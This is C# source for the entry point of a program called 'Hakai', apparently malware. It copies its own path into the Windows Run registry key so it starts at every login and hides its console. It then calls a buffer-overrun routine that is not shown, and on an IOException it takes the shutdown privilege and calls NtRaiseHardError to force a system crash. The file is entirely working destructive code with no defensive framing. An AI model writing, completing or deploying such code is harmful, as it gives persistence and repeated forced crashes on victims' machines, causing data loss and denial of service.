using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Hakai
{
    class Program
    {
        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();

        static void Main(string[] args)
        {
            string executablePath = Process.GetCurrentProcess().MainModule.FileName;
            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Hakai", executablePath);
            key.Close();

            FreeConsole();
            try 
            { 
                BufferOverrun.GoBufferOverrun();
            }
            catch (IOException)
            {
                ProcessAccesAdmin.RtlAdjustPrivilege(ProcessAccesAdmin.Privilege.SeShutdownPrivilege, true, false, out bool previousValue);
                ProcessAccesAdmin.NtRaiseHardError(ProcessAccesAdmin.NTStatus.STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
            }
        }
    }
}